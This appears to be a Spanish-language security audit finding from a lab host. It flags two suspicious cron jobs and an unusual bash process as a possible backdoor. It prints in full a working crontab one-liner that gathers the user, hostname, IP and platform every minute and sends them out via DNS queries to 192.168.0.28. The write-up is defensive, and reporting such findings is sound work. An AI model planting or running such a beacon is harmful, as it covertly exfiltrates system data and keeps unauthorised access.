⏰ Tareas programadas sospechosas (Cron Jobs)

Se detectaron dos tareas en crontab ejecutando código Python cada minuto que envía información del sistema mediante paquetes DNS:

* * * * * python3 -c 'import os,socket;from platform import platform;from scapy.all import *;u=os.popen("whoami").read().strip();h=socket.gethostname();i=socket.gethostbyname(h);s=platform().replace(" ","-");d=f"{u}-{h}-{i}-{s}.lab";p=IP(dst="192.168.0.28")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d));send(p)'

⚠️ Esta actividad es altamente sospechosa y podría estar filtrando información del sistema a una dirección externa (192.168.0.28). Requiere análisis inmediato y eliminación.

🚪 Posibles puertas traseras

Se identificaron múltiples usuarios del sistema con UID < 1000. Aunque muchos son servicios comunes, se encontró un proceso activo con nombre inusual:

  • Proceso sospechoso: adminsu+ ejecutando bash (PID 1512190)

⚠️ Este proceso no es típico de una cuenta legítima y debe ser investigado. Podría estar relacionado con acceso persistente no autorizado.
